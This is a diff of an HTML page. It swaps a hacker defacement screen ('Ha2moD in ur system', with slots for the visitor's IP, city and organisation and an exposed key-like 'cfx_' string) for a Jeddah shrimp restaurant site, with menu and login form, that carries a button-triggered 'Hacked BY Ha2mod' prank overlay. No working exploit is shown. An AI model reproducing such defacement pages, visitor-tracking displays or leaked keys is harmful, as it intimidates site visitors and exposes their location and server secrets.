@@ -1,152 +1,835 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl" class="light">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ha2moD in ur system</title>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<style>
-body {
-    margin:0;
-    padding:0;
-    background:#000;
-    color:#fff;
-    font-family:'JetBrains Mono', monospace;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:flex-start;
-    min-height:100vh;
-}
-.loading-screen {
-    position:fixed;
-    inset:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:#000;
-    z-index:100;
-}
-.loading-text {
-    font-family:'Orbitron', sans-serif;
-    font-size:5rem;
-    color:#fff;
-    text-align:center;
-}
-.main-content {
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    margin-top:50px;
-    width: 100%;
-}
-.gif-container {
-    width:100%;
-    max-width:600px;
-    text-align:center;
-    margin-top:30px;
-}
-.gif-container img {
-    width:100%;
-    border-radius:12px;
-}
-.sub-title {
-    color:#fff;
-    font-family:'Orbitron', sans-serif;
-    font-size:2rem;
-    text-align:center;
-    margin-top:15px;
-}
-.info {
-    margin-top:30px;
-    background:rgba(0,0,0,0.6);
-    padding:25px;
-    border-radius:15px;
-    width:90%;
-    max-width:600px;
-    font-size:16px;
-    line-height:1.8;
-    color:#fff;
-}
-.info span{display:block;margin:5px 0;}
-.footer {
-    margin-top:25px;
-    color:#fff;
-    font-family:'Orbitron', sans-serif;
-    font-size:1rem;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHANTOM ACCESS / Hacked BY Ha2mod | مطعم منطقة الجمبري جدة</title>
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        shrimp: {
+                            50: '#fff7ed',
+                            100: '#ffedd5',
+                            500: '#f97316',
+                            600: '#ea580c',
+                            700: '#c2410c',
+                        },
+                        ocean: {
+                            500: '#0284c7',
+                            800: '#0f172a',
+                            900: '#020617',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- FontAwesome Icons & Fonts -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Poppins:wght@400;600;700&family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Cairo', 'Poppins', sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        /* ======================================================== */
+        /* PHANTOM ACCESS STYLES (Unchanged Original Code & Styling) */
+        /* ======================================================== */
+        #hack-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            overflow-y: auto;
+            z-index: 99999;
+            display: none;
+            direction: ltr;
+            text-align: left;
+        }
+
+        #hack-overlay .popup-video {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 1rem;
+            width: 400px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(0.5rem);
+            z-index: 1000;
+            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        }
+
+        #hack-overlay .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeOut 0s ease-in-out 5s forwards;
+        }
+
+        /* تعديل صورة شاشة التحميل بدلاً من الـ SVG لتصبح قابلة لتغيير الرابط */
+        #hack-overlay .loading-img-custom {
+            width: 9vw;
+            max-width: 150px;
+            height: 9vw;
+            max-height: 150px;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.3);
+            margin-bottom: 2vh;
+            animation: pulseSkull 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseSkull {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 1.25vw rgba(255, 255, 255, 0.3);
+            }
+            50% {
+                transform: scale(1.1);
+                box-shadow: 0 0 2.5vw rgba(255, 255, 255, 0.8);
+            }
+        }
+
+        #hack-overlay .glitch-text {
+            position: relative;
+            color: #fff;
+            font-size: 2.0rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.19rem;
+            line-height: 1.6;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        #hack-overlay .main-content {
+            opacity: 0;
+            animation: fadeIn 2s ease-in-out 0.5s forwards;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 2rem 0;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        #hack-overlay::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 1.875rem 1.875rem;
+            z-index: -1;
+        }
+
+        #hack-overlay .container {
+            text-align: center;
+            max-width: 50rem;
+            padding: 2.5rem;
+        }
+
+        #hack-overlay .avatar-container {
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        #hack-overlay .avatar {
+            width: 31.25rem;
+            max-width: 90vw;
+            height: 18.75rem;
+            max-height: 54vw;
+            border-radius: 0%;
+            border: 0.188rem solid rgba(255,255,255,0.3);
+            box-shadow:
+                0 0 1.875rem rgba(255,255,255,0.2),
+                inset 0 0 1.875rem rgba(255,255,255,0.1);
+            background: linear-gradient(135deg, #333, #111);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        #hack-overlay .avatar:hover {
+            transform: scale(1.05);
+            box-shadow:
+                0 0 3.125rem rgba(255,255,255,0.4),
+                inset 0 0 1.875rem rgba(255,255,255,0.2);
+        }
+
+        #hack-overlay .avatar::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            50% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+            100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+        }
+
+        #hack-overlay .pwned-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 3.75rem;
+            font-weight: 900;
+            letter-spacing: 0.1rem;
+            margin-bottom: 1.25rem;
+            background: linear-gradient(45deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 1.25rem rgba(255,255,255,0.3)); }
+            to { filter: drop-shadow(0 0 2.5rem rgba(255,255,255,0.6)); }
+        }
+
+        #hack-overlay .terminal-section {
+            background: rgba(0,0,0,0.8);
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.625rem;
+            padding: 1.875rem;
+            margin-top: 2.5rem;
+            backdrop-filter: blur(0.625rem);
+            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+        }
+
+        #hack-overlay .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.938rem;
+            border-bottom: 0.063rem solid rgba(255,255,255,0.1);
+        }
+
+        #hack-overlay .terminal-dots {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 1.25rem;
+        }
+
+        #hack-overlay .dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            border: 0.063rem solid rgba(255,255,255,0.3);
+        }
+
+        #hack-overlay .command-line {
+            font-size: 1.5rem; 
+            margin: 0.938rem 0;
+            opacity: 0;
+            animation: typeIn 0.5s ease forwards;
+            display: flex;
+            align-items: center;
+            text-align: left;
+        }
+
+        #hack-overlay .command-line:nth-child(2) { animation-delay: 2.5s; }
+        #hack-overlay .command-line:nth-child(3) { animation-delay: 3s; }
+
+        @keyframes typeIn { to { opacity: 1; } }
+
+        #hack-overlay .prompt {
+            color: rgba(255,255,255,0.5);
+            margin-right: 0.625rem;
+        }
+
+        #hack-overlay .command { color: #fff; font-weight: 500; }
+        #hack-overlay .success { color: #4ade80; font-weight: 600; }
+
+        #hack-overlay .footer-message {
+            margin-top: 2.5rem;
+            font-size: 0.875rem;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.125rem;
+            text-transform: uppercase;
+        }
+
+        #hack-overlay .learn-box {
+            position: absolute;
+            top: 2.975rem;
+            left: 1.875rem;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 1.25rem;
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(0.5rem);
+            z-index: 1000;
+            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        }
+
+        #hack-overlay .learn-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.063rem;
+            text-transform: uppercase;
+        }
+
+        #hack-overlay .learn-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.625rem;
+        }
+
+        #hack-overlay .learn-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 0.063rem solid rgba(255,255,255,0.1);
+            padding: 0.625rem 0.938rem;
+            border-radius: 0.375rem;
+            font-size: 0.813rem;
+            color: #4ade80;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+        }
+
+        #hack-overlay .learn-item:hover, #hack-overlay .learn-item.force-hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transform: translateX(0.313rem);
+        }
+
+        #hack-overlay .learn-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: translateX(-0.313rem);
+            margin-top: 0.938rem;
+            padding-top: 0.625rem;
+            border-top: 0.063rem solid rgba(255,255,255,0.1);
+            gap: 0.625rem;
+        }
+
+        #hack-overlay .discord-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            object-fit: contain;
+            opacity: 0.8;
+        }
+
+        #hack-overlay .discord-link {
+            font-size: 1rem;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.063rem;
+            opacity: 0.8;
+        }
+
+        #hack-overlay .avatar.force-hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 3.125rem rgba(255,255,255,0.4), inset 0 0 1.875rem rgba(255,255,255,0.2);
+        }
+
+        @media (max-width: 768px) {
+            #hack-overlay .pwned-title { font-size: 2rem; }
+            #hack-overlay .avatar { width: 80vw; height: 50vw; }
+            #hack-overlay .learn-box { position: static; margin-bottom: 1rem; }
+        }
+    </style>
 </head>
-<body>
+<body class="bg-orange-50 text-slate-800 dark:bg-slate-900 dark:text-slate-100 transition-colors duration-300">
 
-<!-- Loading Screen -->
-<div class="loading-screen" id="loadingScreen">
-    <div class="loading-text" id="headerText">Ha2moD in ur system</div>
-</div>
+    <header class="sticky top-0 z-40 bg-white/90 dark:bg-slate-800/90 backdrop-blur-md shadow-md border-b border-orange-200 dark:border-slate-700">
+        <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
+            
+            <!-- Logo Section -->
+            <div class="flex items-center space-x-3 space-x-reverse">
+                <div class="w-12 h-12 bg-gradient-to-tr from-shrimp-600 to-amber-500 rounded-2xl flex items-center justify-center text-white shadow-lg text-2xl transform hover:rotate-6 transition">
+                    <i class="fa-solid fa-shrimp"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-extrabold text-shrimp-600 dark:text-orange-400 leading-tight" data-ar="منطقة الجمبري" data-en="Shrimp Zone">منطقة الجمبري</h1>
+                    <p class="text-xs text-slate-500 dark:text-slate-400 font-semibold tracking-wider">JEDDAH - جدة</p>
+                </div>
+            </div>
 
-<!-- Main Content -->
-<div class="main-content" id="mainContent" style="display:none;">
-    <div class="gif-container" id="gifContainer">
-        <img src="https://i.pinimg.com/originals/90/5f/c9/905fc914bbc0cfa71d8f09caa9bf4082.gif" alt="GIF">
+            <!-- Header Controls & Action Buttons -->
+            <div class="flex items-center space-x-2 space-x-reverse">
+                
+                <!-- Fake Hack / Refresh Page Trigger Button -->
+                <button onclick="triggerFakeHack()" class="px-3 py-2 bg-slate-950 hover:bg-black text-green-400 rounded-xl text-xs sm:text-sm font-mono font-bold border border-green-500/40 flex items-center gap-2 shadow hover:scale-105 transition-all">
+                    <i class="fa-solid fa-terminal text-green-400 animate-pulse"></i>
+                    <span dir="ltr" data-ar="تحديث الصفحة" data-en="HACK / Refresh">تحديث الصفحة</span>
+                </button>
+
+                <!-- Language Toggle Button -->
+                <button onclick="toggleLanguage()" id="lang-btn" class="px-3 py-2 bg-orange-100 dark:bg-slate-700 hover:bg-orange-200 dark:hover:bg-slate-600 text-shrimp-700 dark:text-orange-300 rounded-xl text-xs sm:text-sm font-bold transition">
+                    EN
+                </button>
+
+                <!-- Theme Toggle Button -->
+                <button onclick="toggleTheme()" class="p-2 bg-orange-100 dark:bg-slate-700 hover:bg-orange-200 dark:hover:bg-slate-600 text-shrimp-600 dark:text-orange-300 rounded-xl transition" title="Dark / Light Mode">
+                    <i id="theme-icon" class="fa-solid fa-moon text-base"></i>
+                </button>
+
+                <!-- Login Modal Trigger -->
+                <button onclick="openLoginModal()" class="px-4 py-2 bg-shrimp-600 hover:bg-shrimp-700 text-white font-bold text-xs sm:text-sm rounded-xl shadow-md transition">
+                    <i class="fa-solid fa-user ml-1"></i>
+                    <span id="login-text" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</span>
+                </button>
+
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        
+        <!-- Hero Section -->
+        <div class="relative rounded-3xl overflow-hidden shadow-2xl mb-12 bg-gradient-to-r from-shrimp-600 via-orange-500 to-amber-500 text-white p-8 md:p-12 flex flex-col md:flex-row items-center justify-between">
+            <div class="z-10 max-w-xl text-center md:text-right">
+                <span class="bg-white/20 px-3 py-1 rounded-full text-xs md:text-sm font-bold backdrop-blur-md inline-block mb-4" data-ar="📍 الفرع الرئيسي - جدة الكورنيش" data-en="📍 Main Branch - Jeddah Corniche">📍 الفرع الرئيسي - جدة الكورنيش</span>
+                <h2 class="text-3xl md:text-5xl font-black mb-4 leading-tight" data-ar="أشهى خلطات الجمبري والمأكولات البحرية 🔥" data-en="Delicious Seafood & Shrimp Zone Specials 🔥">أشهى خلطات الجمبري والمأكولات البحرية 🔥</h2>
+                <p class="text-orange-100 text-base md:text-lg mb-6" data-ar="تذوق طعم البحار الطازج مع خلطتنا السحرية (الكاجون، الثوم بالزبدة، المكس الحار)." data-en="Experience fresh seafood bags with our signature spices (Cajun, Garlic Butter, Special Mix).">تذوق طعم البحار الطازج مع خلطتنا السحرية (الكاجون، الثوم بالزبدة، المكس الحار).</p>
+                
+                <a href="#advisor" class="inline-flex items-center gap-2 bg-slate-900 hover:bg-slate-800 text-white font-bold px-6 py-3 rounded-2xl transition shadow-xl border border-slate-700">
+                    <i class="fa-solid fa-wand-magic-sparkles text-amber-400"></i>
+                    <span data-ar="مستشار الوجبات (للعميل المحتار)" data-en="Meal Advisor">مستشار الوجبات (للعميل المحتار)</span>
+                </a>
+            </div>
+            
+            <div class="mt-8 md:mt-0 z-10 flex justify-center">
+                <div class="w-56 h-56 md:w-72 md:h-72 rounded-full bg-white/10 p-4 backdrop-blur-md flex items-center justify-center border-4 border-white/20 shadow-inner">
+                    <i class="fa-solid fa-shrimp text-8xl md:text-9xl text-white drop-shadow-2xl animate-bounce" style="animation-duration: 3s;"></i>
+                </div>
+            </div>
+        </div>
+
+        <section class="mb-16">
+            <div class="text-center mb-10">
+                <h3 class="text-3xl font-extrabold text-slate-800 dark:text-white" data-ar="قائمة الأصناف | Menu" data-en="Menu | قائمة الأصناف">قائمة الأصناف | Menu</h3>
+                <p class="text-slate-500 dark:text-slate-400 mt-2 text-sm md:text-base" data-ar="الأسعار شاملة ضريبة القيمة المضافة بالريال السعودي (SAR)" data-en="Prices include VAT in Saudi Riyal (SAR)">الأسعار شاملة ضريبة القيمة المضافة بالريال السعودي (SAR)</p>
+            </div>
+
+            <!-- Menu Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                
+                <!-- Menu Item 1 -->
+                <div class="bg-white dark:bg-slate-800 rounded-3xl shadow-lg hover:shadow-2xl transition-all p-6 border border-orange-100 dark:border-slate-700 flex flex-col justify-between">
+                    <div>
+                        <div class="h-48 bg-orange-100 dark:bg-slate-700 rounded-2xl mb-4 flex items-center justify-center text-shrimp-600 dark:text-orange-400">
+                            <i class="fa-solid fa-box-open text-6xl"></i>
+                        </div>
+                        <div class="flex justify-between items-start mb-2">
+                            <div>
+                                <h4 class="text-xl font-bold text-slate-800 dark:text-white" data-ar="كيس جمبري منطقة الجمبري" data-en="Shrimp Zone Bag">كيس جمبري منطقة الجمبري</h4>
+                                <span class="text-xs text-slate-400 font-mono font-semibold">Shrimp Zone Bag</span>
+                            </div>
+                            <span class="bg-shrimp-100 dark:bg-orange-950/80 text-shrimp-700 dark:text-orange-300 text-sm font-black px-3 py-1.5 rounded-full">
+                                79 SAR
+                            </span>
+                        </div>
+                        <p class="text-slate-600 dark:text-slate-300 text-sm mb-4" data-ar="نصف كيلو جمبري طازج مطبوخ بخلطة الكاجون الخاصة مع قطعة ذرة حلوة." data-en="Half kilo fresh shrimp cooked in special Cajun sauce with sweet corn.">نصف كيلو جمبري طازج مطبوخ بخلطة الكاجون الخاصة مع قطعة ذرة حلوة.</p>
+                    </div>
+                    <button onclick="showToast('تمت الإضافة إلى السلة بنجاح!')" class="w-full py-3 bg-shrimp-600 hover:bg-shrimp-700 text-white font-bold rounded-xl transition shadow" data-ar="إضافة للسلة" data-en="Add to Cart">إضافة للسلة</button>
+                </div>
+
+                <!-- Menu Item 2 -->
+                <div class="bg-white dark:bg-slate-800 rounded-3xl shadow-lg hover:shadow-2xl transition-all p-6 border border-orange-100 dark:border-slate-700 flex flex-col justify-between">
+                    <div>
+                        <div class="h-48 bg-amber-100 dark:bg-slate-700 rounded-2xl mb-4 flex items-center justify-center text-amber-600 dark:text-amber-400">
+                            <i class="fa-solid fa-drumstick-bite text-6xl"></i>
+                        </div>
+                        <div class="flex justify-between items-start mb-2">
+                            <div>
+                                <h4 class="text-xl font-bold text-slate-800 dark:text-white" data-ar="ديناميت شريمب" data-en="Dynamite Shrimp">ديناميت شريمب</h4>
+                                <span class="text-xs text-slate-400 font-mono font-semibold">Dynamite Shrimp</span>
+                            </div>
+                            <span class="bg-shrimp-100 dark:bg-orange-950/80 text-shrimp-700 dark:text-orange-300 text-sm font-black px-3 py-1.5 rounded-full">
+                                45 SAR
+                            </span>
+                        </div>
+                        <p class="text-slate-600 dark:text-slate-300 text-sm mb-4" data-ar="قطع الجمبري المقرمشة بصلصة الديناميت الحارة والغنية بالنكهات." data-en="Crispy shrimp coated with rich spicy dynamite sauce.">قطع الجمبري المقرمشة بصلصة الديناميت الحارة والغنية بالنكهات.</p>
+                    </div>
+                    <button onclick="showToast('تمت الإضافة إلى السلة بنجاح!')" class="w-full py-3 bg-shrimp-600 hover:bg-shrimp-700 text-white font-bold rounded-xl transition shadow" data-ar="إضافة للسلة" data-en="Add to Cart">إضافة للسلة</button>
+                </div>
+
+                <!-- Menu Item 3 -->
+                <div class="bg-white dark:bg-slate-800 rounded-3xl shadow-lg hover:shadow-2xl transition-all p-6 border border-orange-100 dark:border-slate-700 flex flex-col justify-between">
+                    <div>
+                        <div class="h-48 bg-sky-100 dark:bg-slate-700 rounded-2xl mb-4 flex items-center justify-center text-sky-600 dark:text-sky-400">
+                            <i class="fa-solid fa-fish text-6xl"></i>
+                        </div>
+                        <div class="flex justify-between items-start mb-2">
+                            <div>
+                                <h4 class="text-xl font-bold text-slate-800 dark:text-white" data-ar="وجبة فيليه سمك مقرمش" data-en="Crispy Fish Fillet Meal">وجبة فيليه سمك مقرمش</h4>
+                                <span class="text-xs text-slate-400 font-mono font-semibold">Crispy Fish Fillet Meal</span>
+                            </div>
+                            <span class="bg-shrimp-100 dark:bg-orange-950/80 text-shrimp-700 dark:text-orange-300 text-sm font-black px-3 py-1.5 rounded-full">
+                                52 SAR
+                            </span>
+                        </div>
+                        <p class="text-slate-600 dark:text-slate-300 text-sm mb-4" data-ar="شرائح سمك الذهبية المقرمشة تُقدم مع بطاطس مقلية وصلصة التارتار." data-en="Golden fried fish fillet served with french fries and tartar dip.">شرائح سمك الذهبية المقرمشة تُقدم مع بطاطس مقلية وصلصة التارتار.</p>
+                    </div>
+                    <button onclick="showToast('تمت الإضافة إلى السلة بنجاح!')" class="w-full py-3 bg-shrimp-600 hover:bg-shrimp-700 text-white font-bold rounded-xl transition shadow" data-ar="إضافة للسلة" data-en="Add to Cart">إضافة للسلة</button>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Meal Advisor Section -->
+        <section id="advisor" class="bg-slate-900 text-white rounded-3xl p-8 md:p-12 shadow-2xl relative overflow-hidden mb-16 border border-slate-800">
+            <div class="max-w-2xl relative z-10">
+                <span class="text-amber-400 font-bold text-sm tracking-widest uppercase block mb-2" data-ar="💡 خدمة العميل المحتار" data-en="💡 Confused Customer Tool">💡 خدمة العميل المحتار</span>
+                <h3 class="text-3xl font-black mb-4" data-ar="محتار وش تطلب اليوم؟ 🤔" data-en="Undecided What to Order? 🤔">محتار وش تطلب اليوم؟ 🤔</h3>
+                <p class="text-slate-300 mb-6" data-ar="اختر تفضيلاتك وسنقوم بتوصيتك بالوجبة والمميزات المناسبة لميزانيتك وعددهم!" data-en="Select your options and let our AI tool recommend the perfect meal combination!">اختر تفضيلاتك وسنقوم بتوصيتك بالوجبة والمميزات المناسبة لميزانيتك وعددهم!</p>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                    <div>
+                        <label class="block text-xs font-semibold mb-2 text-slate-300" data-ar="عدد الأشخاص" data-en="Number of People">عدد الأشخاص</label>
+                        <select id="adv-people" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white text-sm focus:outline-none focus:border-amber-400">
+                            <option value="1">شخص واحد (Solo)</option>
+                            <option value="2">شخصين (2 People)</option>
+                            <option value="4">مجموعة / عائلة (4+ People)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold mb-2 text-slate-300" data-ar="مستوى الحرارة" data-en="Spice Level">مستوى الحرارة</label>
+                        <select id="adv-spice" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white text-sm focus:outline-none focus:border-amber-400">
+                            <option value="mild">بارد (Mild)</option>
+                            <option value="medium">متوسط (Medium)</option>
+                            <option value="spicy">حار جداً 🔥 (Spicy)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold mb-2 text-slate-300" data-ar="الميزانية التقريبية" data-en="Approx. Budget">الميزانية التقريبية</label>
+                        <select id="adv-budget" class="w-full bg-slate-800 border border-slate-700 rounded-xl p-3 text-white text-sm focus:outline-none focus:border-amber-400">
+                            <option value="low">أقل من 100 SAR</option>
+                            <option value="med">100 - 200 SAR</option>
+                            <option value="high">أكثر من 200 SAR</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button onclick="calculateAdvice()" class="w-full py-4 bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-slate-950 font-black rounded-xl transition shadow-lg text-base">
+                    <i class="fa-solid fa-magnifying-glass font-bold ml-1"></i>
+                    <span data-ar="إظهار الوجبة المقترحة ✨" data-en="Show Recommendation ✨">إظهار الوجبة المقترحة ✨</span>
+                </button>
+
+                <div id="advisor-result" class="hidden mt-6 p-5 bg-slate-800/90 border border-amber-400/40 rounded-2xl animate-fade-in">
+                    <!-- Dynamic Recommendation Text -->
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <div id="login-modal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white dark:bg-slate-800 w-full max-w-md rounded-3xl p-6 shadow-2xl relative border border-orange-100 dark:border-slate-700">
+            <button onclick="closeLoginModal()" class="absolute top-4 left-4 text-slate-400 hover:text-slate-600 dark:hover:text-white text-2xl font-bold">&times;</button>
+            <h3 class="text-2xl font-black text-slate-800 dark:text-white mb-2" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</h3>
+            <p class="text-sm text-slate-500 dark:text-slate-400 mb-6" data-ar="أهلاً بك في حساب مطعم منطقة الجمبري" data-en="Welcome to Shrimp Zone Account">أهلاً بك في حساب مطعم منطقة الجمبري</p>
+            
+            <form onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold mb-1 text-slate-700 dark:text-slate-300" data-ar="رقم الجوال أو البريد الإلكتروني" data-en="Mobile or Email">رقم الجوال أو البريد الإلكتروني</label>
+                    <input type="text" required placeholder="05xxxxxxxx" class="w-full p-3 rounded-xl border border-slate-300 dark:border-slate-600 dark:bg-slate-700 dark:text-white text-sm focus:outline-none focus:ring-2 focus:ring-shrimp-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold mb-1 text-slate-700 dark:text-slate-300" data-ar="كلمة المرور" data-en="Password">كلمة المرور</label>
+                    <input type="password" required placeholder="••••••••" class="w-full p-3 rounded-xl border border-slate-300 dark:border-slate-600 dark:bg-slate-700 dark:text-white text-sm focus:outline-none focus:ring-2 focus:ring-shrimp-500">
+                </div>
+                <button type="submit" class="w-full py-3.5 bg-shrimp-600 hover:bg-shrimp-700 text-white font-bold rounded-xl shadow-md text-sm" data-ar="دخول" data-en="Submit">دخول</button>
+            </form>
+        </div>
     </div>
 
-    <div class="sub-title" id="subTitle">u'v been hacked by Ha2moD uwu 
-
-
-الون سينك الخاص بالسيرفر : cfx_1ZUVnveSRQ1spqqpl2wEw_4702IR . </div>
-
-    <div class="info" id="ip-info">
-        <span><strong>IP:</strong> <span id="ip">loading...</span></span>
-        <span><strong>City:</strong> <span id="city">loading...</span></span>
-        <span><strong>Region:</strong> <span id="region">loading...</span></span>
-        <span><strong>Country:</strong> <span id="country">loading...</span></span>
-        <span><strong>Location:</strong> <span id="loc">loading...</span></span>
-        <span><strong>Organization:</strong> <span id="org">loading...</span></span>
-        <span><strong>Timezone:</strong> <span id="timezone">loading...</span></span>
+    <!-- Notification Toast -->
+    <div id="toast" class="fixed bottom-5 right-5 bg-slate-900 text-white px-5 py-3 rounded-xl shadow-2xl hidden z-50 text-sm border border-slate-700 flex items-center gap-2">
+        <i class="fa-solid fa-circle-check text-green-400 text-lg"></i>
+        <span id="toast-msg">تمت العملية بنجاح!</span>
     </div>
 
-    <div class="footer">© Ha2mod Network</div>
-</div>
+    <!-- ======================================================== -->
+    <!-- OVERLAY: PHANTOM ACCESS (YOUR ORIGINAL CODE UNCHANGED)    -->
+    <!-- ======================================================== -->
+    <div id="hack-overlay">
+        <audio id="bg-music" loop>
+            <source src="https://cdn.discordapp.com/attachments/1423480461761712251/1559676281208176640/ssstik.io_1791926195128.mp3?ex=6acff13a&is=6ace9fba&hm=27802850b73351d6248c05946d3fc6ba68f5aeac516108f59a3b238189039206&" type="audio/mpeg">
+        </audio>
 
-<audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1423480461761712251/1507115977475621135/Download_8.mp3?ex=6a10baa1&is=6a0f6921&hm=e5f0b840622ca4342ac149bc7446e44116c01e3f60c90a57e9b7531906744351&" type="audio/mpeg">
-</audio>
+        <!-- Exit Control Button -->
+        <button onclick="closeFakeHack()" style="position: fixed; top: 15px; left: 15px; z-index: 100000; background: rgba(220, 38, 38, 0.9); color: white; border: 1px solid rgba(255,255,255,0.3); padding: 8px 16px; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: sans-serif;">
+            ✖ إغلاق / Exit
+        </button>
 
-<script>
-// عرض Ha2moD أولاً ثم المحتوى
-window.addEventListener('load', function() {
-    setTimeout(()=>{
-        document.getElementById('loadingScreen').style.display = 'none';
-        document.getElementById('mainContent').style.display = 'flex';
-    },2000);
-});
+        <!-- Loading Screen: تم استبدال الـ SVG بصورة قابلة لتغيير الرابط مباشرة -->
+        <div class="loading-screen">
+            <img src="https://cdn.discordapp.com/attachments/1483899864063676447/1559682389452521623/1533704836376166421.gif?ex=6acff6eb&is=6acea56b&hm=979d3fe6c2691252d52693bff710dc1d5c12ebd917379835d1f215e336591292&" alt="Loading Avatar" class="loading-img-custom" />
+            <div class="loading-text glitch-text" data-text="Security Alert Ha2mod in the system ..">
